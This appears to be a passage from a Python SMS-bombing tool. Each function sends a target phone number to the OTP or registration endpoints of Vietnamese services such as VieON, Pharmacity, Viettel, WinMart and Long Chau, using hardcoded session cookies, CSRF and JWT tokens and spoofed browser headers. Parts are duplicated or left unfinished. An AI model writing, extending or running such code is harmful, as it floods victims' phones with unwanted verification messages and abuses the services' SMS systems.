    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
#vieon2
def vieon1(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)        

#vieon3    
def VIEON(sdt):
    head = {
        "Host": "api.vieon.vn",
        "accept": "application/json, text/plain, /",
        "authorization": token,
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://vieon.vn",
        "referer": "https://vieon.vn/"
    }
    data = 'phonenumber=' + sdt + '&password=123456789&givenname=&deviceid=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobileweb&model=Android%2012&pushtoken=&devicename=Chrome%2F96&devicetype=desktop&ui=012021'
    access = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobileweb&ui=012021", data=data, headers=head)
#vieon4
def vieon1(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
    
#pizzacompany
def pizzacompany(sdt):
  cookies = {
    '_gcl_au': '1.1.607819339.1691276885',
    '_ga': 'GA1.2.453948248.1691276886',
    '_gid': 'GA1.2.698696022.1691276886',
    '_tt_enable_cookie': '1',
    '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
    '_fbp': 'fb.1.1691276888170.1960321660',
    '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
    '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
    '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  headers = {
    'Host': 'thepizzacompany.vn',
    # 'content-length': '199',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thepizzacompany.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thepizzacompany.vn/Otp',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  data = {
    'phone': f'{sdt}',
    '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
  }
  response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()    
#phamacy
def phamacy(sdt):
  headers = {
    'Host': 'api-gateway.pharmacity.vn',
    # 'content-length': '36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://www.pharmacity.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.pharmacity.vn/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"sdt","referral":""}'.replace("sdt",sdt)
  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', data=data,headers=headers)  
#fpt
def fpt(phone):
  requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
#tv360
def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text  
    
#testapi.py
#gogogizmo
def gogogizmo(sdt):
  headers = {
    'authority': 'gogogizmo.shop',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'lang': 'vi_VN',
    'origin': 'https://gogogizmo.shop',
    'referer': 'https://gogogizmo.shop/pages/user/Login/index',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': "84" + sdt ,
    'email': ' ',
    'type': 'register',
    'regType': '1',
  }

  response = requests.post('https://gogogizmo.shop/api/register/verify', headers=headers, json=json_data)
  
#pkdkdphuong
def pkdkdphuong(sdt):
  headers = {
    'authority': 'nasda.mn',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/x-www-form-urlencoded',
    'lang': 'vi',
    'origin': 'https://nasda.mn',
    'referer': 'https://nasda.mn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'token': '',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  data = {
    'mobile': + sdt ,
    'event': 'register',
  }

  response = requests.post('https://nasda.mn/api/sms/aliSend', headers=headers, data=data)
  
#bluescope
def bluescope(sdt):
  headers = {
    'authority': 'admin.bluescope-app.ru',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://m.bluescope-vip.com',
    'referer': 'https://m.bluescope-vip.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'account': "84" + sdt ,
    'passwordType': 'REGISTER',
  }

  response = requests.post('https://admin.bluescope-app.ru/rest/api/customers/sendVerifyCode', headers=headers, json=json_data)

#winmart
def winmart(sdt):
  headers = {
    'authority': 'api-crownx.winmart.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'origin': 'https://winmart.vn',
    'referer': 'https://winmart.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  params = {
    'phoneNo': "84" + sdt ,
  }

  response = requests.get('https://api-crownx.winmart.vn/as/api/web/v1/send-otp', params=params, headers=headers)
  
#medigoapp
def medigoapp(sdt):
  headers = {
    'authority': 'auth.medigoapp.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.medigoapp.com',
    'referer': 'https://www.medigoapp.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': "+84" + sdt ,
  }

  response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
  
#
  headers = {
    'authority': 'api.nhathuoclongchau.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'authorization': '',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-channel': 'EStore',
  }

  json_data = {
    'phoneNumber': "84" + sdt ,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
  }

  response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
  )
  
#nhathuocankhang
def nhathuocankhang(sdt):
  cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8OzT4w9F3NBBtKYXpiQJSWtbPxkgf9niVbr-A8_b54VRk9EwW1dUlLkPyrkqAHpgqJ6InlJ-o1l4EeR5HYe1rJjL08ILcZrnXKPjUTpSzFuzBHNpvJFBLCQvvBJNA6akgcSlsugBBCkoby2rB1wytbU',
    'MWG_PRODUCT_BASIC_DB': 'HyquOkFO4n2EMZkPRMdZ7%2FCpi7fO462DztzR0HUNlniov5_ncPwr1A--',
    'MWG_CART_SS_10': 'CfDJ8EAyW5oxzlJBpu%2Fem4xhyNuSX%2BAvdK%2FAPsi9sIjzVyiqnwUDA9QrUbaD2IWKgpib1iRk4n1vCOgespXoAKw%2BETBDSDzpbDKPXyWsuJgk7g%2FmUPbYoWqOCm7sU7SLB91pwX2P8h4jW5ROzN0lKrN7nXOvOWS583as8Rz7gqwJtL67',
    '_pk_ref.2.b94a': '%5B%22%22%2C%22%22%2C1695922087%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.2.b94a': '95fa589c26e0a0af.1695922087.',
    '_pk_ses.2.b94a': '1',
    '_gcl_au': '1.1.603406077.1695922088',
    '_ga': 'GA1.1.1284062655.1695922088',
    'cebs': '1',
    '_ce.s': 'v~549c1fab6cf28b01ba1bd61b556bc985441d6588~lcw~1695922089892~vpv~0~lcw~1695922089904',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-957%2C171.250.162.38%2C2%2Ca19ac38e49c47d5c6963dc341558372d',
    'ASP.NET_SessionId': 'ioxvprqp3ifyed0h30j0pixb',
    '.AspNetCore.Antiforgery.4PZsHduyjpg': 'CfDJ8ImUV2tmepFDqJx13sccnB58D5oUm8oWvgyR2MkrGVCx1TLW0nQ0pjwzBM3tnKoPiMwduNFCi3X1pGpl5Eia70R055Rqvpv16Hm0SuxHG2VxhQwBoWMJPMGro6a8h1TAlc6Pm2J35UocrqymM6Mk93o',
